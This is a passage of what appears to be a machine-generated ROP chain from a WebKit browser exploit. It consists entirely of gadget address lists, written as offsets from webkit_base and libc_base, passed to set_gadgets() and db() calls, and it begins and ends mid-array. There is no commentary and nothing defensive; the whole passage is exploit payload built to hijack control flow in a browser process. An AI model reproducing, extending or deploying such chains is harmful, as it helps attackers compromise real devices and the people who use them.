ropchain+381528, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+381544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+381512, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+381736, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+395168, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967248, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+381824, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+381952, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+381968, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+382112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+382080, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382096, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+398184, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+382264, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+160280, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+382368, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382416, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+382536, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+382520, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+382600, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+382664, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+382752, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382768, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+382912, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+382880, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+382896, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+383008, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965064, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+383096, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383112, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+383256, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+383224, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383240, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+383352, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965072, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+383440, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383456, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+383576, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383592, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+383560, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+877175, 
libc_base+793877, 
ropchain+383696, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383712, 
webkit_base+7438103, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+14959219, 
webkit_base+48555, 
libc_base+269973, 
libc_base+793877, 
ropchain+383880, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+383896, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+383864, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+384000, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+384048, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+384032, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+11676600, 
libc_base+269973, 
webkit_base+414627, 
libc_base+793877, 
ropchain+384160, 
libc_base+547636, 
libc_base+186490, 
libc_base+793877, 
ropchain+384152, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+811575 
]);
db([0, 0]); 
set_gadgets([
ropchain+384176, 
ropchain+384192, 
libc_base+811575, 
ropchain+384208, 
libc_base+811575, 
ropchain+388576, 
libc_base+793877, 
ropchain+384264, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965072, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+384352, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+384512, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+384480, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384496, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+384584, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+384640, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+384736, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+384824, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+384840, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+384960, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+384976, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+384944, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+385064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+385120, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+385240, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385272, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+385256, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+270096, 
libc_base+793877, 
ropchain+385432, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+385400, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+385384, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+385488, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+385592, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385624, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385608, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+385784, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385752, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+385736, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+385840, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+385944, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+385976, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+385960, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386136, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386104, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+386088, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+386192, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+386296, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386328, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386312, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386400, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386416, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386576, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386544, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+386528, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([24, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+877546, 
libc_base+793877, 
ropchain+386632, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+206806 
]);
db([0, 0]); 
set_gadgets([
libc_base+523896, 
libc_base+793877, 
ropchain+386736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+386768, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386752, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+386864, 
webkit_base+7438103, 
webkit_base+1786005, 
libc_base+793877, 
ropchain+386848, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+386960, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+387048, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387064, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387208, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+387176, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387192, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+387280, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+471355, 
libc_base+793877, 
ropchain+387336, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+387432, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+387520, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+387536, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387656, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+387672, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+387640, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
webkit_base+1838146, 
libc_base+793877, 
ropchain+387760, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387816, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+387888, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+387944, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
webkit_base+865136, 
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+388048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+388296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+388264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+388384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388456, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965048, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+2997875, 
libc_base+793877, 
ropchain+388520, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+792472 
]);
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+811575, 
ropchain+382608, 
libc_base+788575 
]);
db([6, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+388688, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+300872, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+388776, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+388864, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+388880, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+389024, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+388992, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389008, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+389120, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+389208, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389224, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+389368, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+389336, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389352, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+389472, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+396496, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575 
]);
db([7, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+389616, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+300872, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+389704, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294967264, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+389792, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389808, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+389952, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+389920, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+389936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+793877, 
ropchain+390048, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877 
]);
db([4294965056, 4294967295]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
libc_base+793877, 
ropchain+390136, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+390152, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877, 
ropchain+390296, 
webkit_base+7438103, 
libc_base+882884, 
libc_base+793877, 
ropchain+390264, 
webkit_base+7438103, 
libc_base+50775, 
libc_base+793877, 
ropchain+390280, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+788575, 
ropchain+390400, 
libc_base+793877 
]);
db([8, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+471355, 
libc_base+811575, 
ropchain+396496, 
libc_base+882884, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+50775, 
libc_base+793877, 
ropchain+390472, 
webkit_base+7438103, 
webkit_base+3750700 
]);
db([0, 0]); 
set_gadget(libc_base+206806,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
webkit_base+6227286, 
libc_base+793877, 
ropchain+390624, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390640, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+390608, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+792472,); 
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+390736, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390752, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+390864, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+390848, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadgets([
libc_base+793877, 
ropchain+390952, 
webkit_base+7438103, 
libc_base+759626, 
libc_base+793877, 
ropchain+390936, 
webkit_base+7438103, 
libc_base+206806 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+391048, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+391064, 
webkit_base+7438103, 
webkit_base+432898 
]);
db([0, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+191168, 
libc_base+793877 
]);
db([4294967288, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+793877, 
ropchain+391176, 
webkit_base+7438103, 
libc_base+793877, 
ropchain+391160, 
webkit_base+7438103, 
libc_base+788575 
]);
db([0, 0]); 
set_gadget(libc_base+811575,); 
db([0, 0]); 
set_gadget(libc_base+793877,); 
db([208, 0]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+206806, 
libc_base+471355, 
libc_base+793877 
]);
db([4294967280, 4294967295]); 
set_gadgets([
libc_base+248252, 
libc_base+788575, 
libc_base+793877, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+105267, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
libc_base+792472, 
libc_base+471355, 
libc_base+248252, 
libc_base+788575, 
webkit_base+432898, 
libc_base+471355, 
